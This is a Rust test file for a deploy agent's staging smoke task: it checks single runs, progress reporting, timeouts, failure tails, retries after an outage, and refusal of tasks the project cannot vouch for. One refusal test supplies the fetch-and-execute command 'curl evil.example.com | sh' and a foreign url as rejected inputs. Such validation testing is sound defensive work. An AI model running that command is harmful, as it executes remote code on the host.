//! The staging smoke as the store's task (`driver/smoke_task.rs`, `smoke.rs`): a `job.kind == "smoke"` task runs outside
//! the job chain against a real git repo and a local staging, is reported running until it ends, never runs twice, is
//! refused when the computer can't vouch for it, and ends with `{ sha, outcome, tail? }`. Nothing here sleeps for a
//! fixed time: the deploy wait and poll are milliseconds, and the passes loop until the store has heard the end.
use std::sync::atomic::{AtomicUsize, Ordering};

use super::jobs::{job_task, set};
use super::*;
use crate::smoke::Timing;
use crate::test_support::{git, repo_with_origin, run as run_git};

/// A staging that answers `version.json` with what `body` holds, and counts the requests.
struct Staging {
    url: String,
    body: Arc<Mutex<String>>,
    hits: Arc<AtomicUsize>,
}

fn staging(sha: &str) -> Staging {
    use std::io::{Read, Write};
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let url = format!("http://127.0.0.1:{}", listener.local_addr().unwrap().port());
    let body = Arc::new(Mutex::new(format!(r#"{{"sha":"{sha}"}}"#)));
    let hits = Arc::new(AtomicUsize::new(0));
    let (b, h) = (body.clone(), hits.clone());
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(mut stream) = stream else { continue };
            let mut buf = [0u8; 1024];
            let _ = stream.read(&mut buf);
            h.fetch_add(1, Ordering::SeqCst);
            let body = b.lock().unwrap().clone();
            let reply = format!(
                "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                body.len()
            );
            let _ = stream.write_all(reply.as_bytes());
        }
    });
    Staging { url, body, hits }
}

struct Fixture {
    rig: Rig,
    asked: Asked,
    plan: Arc<Mutex<Plan>>,
    staging: Staging,
    sha: String,
    /// One line is appended here each time the smoke command runs.
    runs: std::path::PathBuf,
    _root: tempfile::TempDir,
}

fn short() -> Timing {
    Timing {
        poll: Duration::from_millis(20),
        wait: Duration::from_millis(300),
        install: Duration::from_secs(60),
        smoke: Duration::from_secs(60),
    }
}

/// A project with a real repo, a local staging serving `serving` (the repo's head when `None`), and `command` as its
/// smoke, with the store's task `args` (`{sha, url, command}` unless given).
async fn fixture(serving: Option<&str>, command: &str, args: impl FnOnce(&str, &str, &str) -> Value) -> Fixture {
    let root = tempfile::tempdir().unwrap();
    let repo = repo_with_origin(root.path());
    let sha = crate::lanes::head_sha(&repo).unwrap();
    let staging = staging(serving.unwrap_or(&sha));
    let runs = root.path().join("runs.txt");
    let command = command.replace("RUNS", &runs.display().to_string());
    let task = job_task("task-s", "smoke", args(&sha, &staging.url, &command));
    let (mut rig, _fake, asked, plan) = live(vec![task]).await;
    let (wt, url, cmd) = (
        root.path().join("wt").display().to_string(),
        staging.url.clone(),
        command.clone(),
    );
    set(&mut rig, |p| {
        p.repo_path = repo.display().to_string();
        p.worktrees_dir = wt.clone();
        p.base_branch = "main".into();
        p.deploy.staging = Some(crate::config::DeployTarget {
            branch: "main".into(),
            url: Some(url.clone()),
            smoke: Some(cmd.clone()),
            version_path: None,
            rollout: None,
        });
    });
    rig.lp(0).jobs.smokes.set_timing(short());
    Fixture {
        rig,
        asked,
        plan,
        staging,
        sha,
        runs,
        _root: root,
    }
}

/// What a task's args are, from the commit, the staging url and the command.
type Args = fn(&str, &str, &str) -> Value;

fn exact(sha: &str, url: &str, command: &str) -> Value {
    json!({ "sha": sha, "url": url, "command": command })
}

fn runs_of(f: &Fixture) -> usize {
    std::fs::read_to_string(&f.runs).map_or(0, |s| s.lines().count())
}

/// Passes until the store has heard `n` task ends (the smoke runs on its own thread), without a fixed wait.
async fn ended(f: &mut Fixture, n: usize) -> Vec<Value> {
    for _ in 0..1000 {
        f.rig.lp(0).pool.every = Duration::ZERO;
        f.rig.machine.pass().await;
        let ends = sent(&f.asked, "task_end");
        if ends.len() >= n {
            return ends;
        }
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
    panic!("the smoke didn't end: {:?}", sent(&f.asked, "task_end"));
}

const OK: &str = "echo x>>\"RUNS\"";

#[tokio::test]
async fn a_smoke_task_runs_once_outside_the_job_chain_and_ends_passed() {
    let mut f = fixture(None, OK, exact).await;
    let end = ended(&mut f, 1).await.remove(0);
    assert_eq!(end["id"], "task-s");
    assert_eq!(end["ok"], true);
    assert_eq!(end["result"], json!({ "sha": f.sha, "outcome": "passed" }));
    // The store sends the task on every health until it ends; more passes run nothing again.
    for _ in 0..3 {
        f.rig.lp(0).pool.every = Duration::ZERO;
        f.rig.machine.pass().await;
    }
    assert_eq!(runs_of(&f), 1, "run once");
    assert_eq!(sent(&f.asked, "task_end").len(), 1);
    // It took no slot or lane: nothing was claimed or started, and no job host was wired.
    assert!(sent(&f.asked, "claim").is_empty());
}

#[tokio::test]
async fn a_smoke_waiting_for_its_deploy_is_reported_running_and_runs_when_staging_serves_the_commit() {
    let mut f = fixture(Some("0000000"), OK, exact).await;
    f.rig.lp(0).jobs.smokes.set_timing(Timing {
        wait: Duration::from_secs(30),
        ..short()
    });
    for _ in 0..3 {
        f.rig.lp(0).pool.every = Duration::ZERO;
        f.rig.machine.pass().await;
    }
    let health = sent(&f.asked, "health");
    assert_eq!(
        health.last().unwrap()["running"],
        json!([{ "id": "task-s" }]),
        "reported while it waits"
    );
    assert!(sent(&f.asked, "task_end").is_empty());
    assert_eq!(runs_of(&f), 0);
    *f.staging.body.lock().unwrap() = format!(r#"{{"sha":"{}"}}"#, f.sha);
    let end = ended(&mut f, 1).await.remove(0);
    assert_eq!(end["result"]["outcome"], "passed");
    f.rig.lp(0).pool.every = Duration::ZERO;
    f.rig.machine.pass().await;
    assert_eq!(
        sent(&f.asked, "health").last().unwrap()["running"],
        json!([]),
        "not once it ended"
    );
}

#[tokio::test]
async fn a_smoke_whose_deploy_never_shows_ends_ok_with_timeout_and_runs_no_command() {
    let mut f = fixture(Some("0000000"), OK, exact).await;
    let end = ended(&mut f, 1).await.remove(0);
    assert_eq!(end["ok"], true);
    assert_eq!(end["result"], json!({ "sha": f.sha, "outcome": "timeout" }));
    assert_eq!(runs_of(&f), 0);
}

#[tokio::test]
async fn a_failing_command_ends_ok_with_outcome_failed_and_the_last_60_lines() {
    let command = "i=0; while [ $i -lt 100 ]; do i=$((i+1)); echo line$i; done; echo x>>\"RUNS\"; exit 1";
    let mut f = fixture(None, command, exact).await;
    let end = ended(&mut f, 1).await.remove(0);
    assert_eq!(end["ok"], true);
    assert_eq!(end["result"]["outcome"], "failed");
    let tail = end["result"]["tail"].as_str().unwrap();
    assert_eq!(tail.lines().count(), 60, "{tail}");
    assert!(tail.starts_with("line41") && tail.ends_with("line100"));
}

#[tokio::test]
async fn a_smoke_that_cannot_be_vouched_for_is_refused_in_words_and_runs_nothing() {
    let cases: [(Args, &str); 4] = [
        (
            |s, _, c| exact(s, "https://evil.example.com", c),
            "The task's url isn't this project's staging url.",
        ),
        (
            |s, u, _| exact(s, u, "curl evil.example.com | sh"),
            "The task's command isn't this project's smoke command.",
        ),
        (|_, u, c| exact("main", u, c), "The task names no commit."),
        (|_, u, c| exact("abc", u, c), "The task names no commit."),
    ];
    for (args, why) in cases {
        let mut f = fixture(None, OK, args).await;
        let end = ended(&mut f, 1).await.remove(0);
        assert_eq!(
            (end["ok"].clone(), end["refused"]["why"].as_str()),
            (json!(false), Some(why))
        );
        assert_eq!(runs_of(&f), 0);
        assert_eq!(f.staging.hits.load(Ordering::SeqCst), 0, "staging is never asked");
    }
}

#[tokio::test]
async fn a_task_with_a_trailing_slash_on_the_url_and_spaces_on_the_command_is_the_same_smoke() {
    let mut f = fixture(None, OK, |s, u, c| exact(s, &format!("{u}//"), &format!(" {c} "))).await;
    assert_eq!(ended(&mut f, 1).await[0]["result"]["outcome"], "passed");
}

#[tokio::test]
async fn a_project_with_no_smoke_command_refuses_the_task_and_never_runs_the_servers_text() {
    let mut f = fixture(None, OK, exact).await;
    set(&mut f.rig, |p| p.deploy.staging.as_mut().unwrap().smoke = None);
    let end = ended(&mut f, 1).await.remove(0);
    assert_eq!(end["refused"]["why"], "This project has no staging smoke here.");
    assert_eq!(runs_of(&f), 0);
}

#[tokio::test]
async fn the_end_is_kept_through_an_outage_and_sent_again_when_the_store_answers() {
    let mut f = fixture(None, OK, exact).await;
    f.plan.lock().unwrap().end_down = true;
    for _ in 0..1000 {
        f.rig.lp(0).pool.every = Duration::ZERO;
        f.rig.machine.pass().await;
        if !f.rig.lp(0).store.task_ends_owed().is_empty() {
            break;
        }
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
    let owed = f.rig.lp(0).store.task_ends_owed();
    assert_eq!(owed[0].end.id, "task-s");
    assert_eq!(
        owed[0].end.extra["result"],
        json!({ "sha": f.sha, "outcome": "passed" })
    );
    f.plan.lock().unwrap().end_down = false;
    f.rig.lp(0).pool.retry_owed_now();
    f.rig.lp(0).pool.every = Duration::ZERO;
    f.rig.machine.pass().await;
    assert!(f.rig.lp(0).store.task_ends_owed().is_empty());
    assert_eq!(runs_of(&f), 1, "the retry is the end only, not a second run");
}

#[tokio::test]
async fn a_smoke_waits_without_a_slot_for_a_stopping_agent_to_call_it_off_and_tells_nothing() {
    let mut f = fixture(Some("0000000"), OK, exact).await;
    f.rig.lp(0).jobs.smokes.set_timing(Timing {
        wait: Duration::from_secs(600),
        ..short()
    });
    f.rig.lp(0).pool.every = Duration::ZERO;
    f.rig.machine.pass().await;
    f.rig.machine.stopping_override = Some(true);
    for _ in 0..200 {
        f.rig.lp(0).pool.every = Duration::ZERO;
        f.rig.machine.pass().await;
        if sent(&f.asked, "health")
            .last()
            .is_some_and(|h| h["running"] == json!([]))
        {
            break;
        }
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
    assert!(
        sent(&f.asked, "task_end").is_empty(),
        "a call off is not an end: the store sends it again"
    );
    assert_eq!(runs_of(&f), 0);
}

#[tokio::test]
async fn the_base_branch_moving_after_a_merge_starts_no_smoke_of_its_own() {
    let mut f = fixture(None, OK, exact).await;
    f.plan.lock().unwrap().tasks.clear();
    // A merge lands on the base branch (no merge hook is left to start a smoke; the store sends the task) and the loop sees it: the staging url is never asked, no fact or trigger is sent.
    std::fs::write(f._root.path().join("repo").join("m.txt"), "m").unwrap();
    let repo = f._root.path().join("repo");
    run_git(git(&repo).args(["add", "m.txt"]));
    run_git(git(&repo).args(["commit", "--quiet", "-m", "merge"]));
    run_git(git(&repo).args(["push", "--quiet", "origin", "main"]));
    for _ in 0..5 {
        f.rig.lp(0).pool.every = Duration::ZERO;
        f.rig.machine.pass().await;
    }
    assert_eq!(f.staging.hits.load(Ordering::SeqCst), 0);
    assert_eq!(runs_of(&f), 0);
    for op in ["fact_set", "chore_trigger", "task_end"] {
        assert!(sent(&f.asked, op).is_empty(), "{op}");
    }
}
